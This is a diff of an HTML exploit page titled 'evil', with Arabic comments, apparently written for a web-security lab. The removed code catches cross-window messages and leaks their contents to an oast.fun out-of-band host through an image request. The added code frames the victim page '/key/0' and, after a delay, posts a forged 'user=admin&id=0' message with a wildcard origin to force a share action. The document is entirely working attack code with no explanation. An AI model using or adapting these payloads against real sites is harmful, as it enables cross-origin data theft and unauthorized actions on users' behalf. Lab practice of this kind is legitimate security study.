@@ -1,30 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>test</title>
+  <meta charset="UTF-8">
+  <title>evil</title>
 </head>
 <body>
 
+<!-- iframe منفصل فيه صفحة key/0 -->
+<iframe
+  id="victim"
+  src="http://ptl-bf51ffffdb02-188e9eb63e67.libcurl.me/key/0"
+  style="width:300px;height:200px;border:1px solid black;">
+</iframe>
+
 <script>
-window.addEventListener("message", function (event) {
+setTimeout(function () {
 
-    // تحويل الداتا لنص حقيقي
-    var dataAsText = encodeURIComponent(
-        typeof event.data === "object"
-            ? JSON.stringify(event.data)
-            : event.data
-    );
+  /* نفس الفورمات اللي الزرار بيبعته */
+  var msg = "user=admin&id=0";
 
-    // إرسال الداتا
-    var img = document.createElement("img");
-    img.src = "http://wlikmodtjuxpisuqbswjvxs2tboi59zla.oast.fun/?leak=" + dataAsText;
-    document.body.appendChild(img);
+  /* إجبار الصفحة تعمل share */
+  document
+    .getElementById("victim")
+    .contentWindow
+    .postMessage(msg, "*");
 
-}, false);
-
-// فتح الصفحة اللي بتبعت الرسالة
-window.open("https://ptl-dd2cc21c196c-b6243f83a99e.libcurl.me/key/0");
+}, 3000);
 </script>
 
 </body>
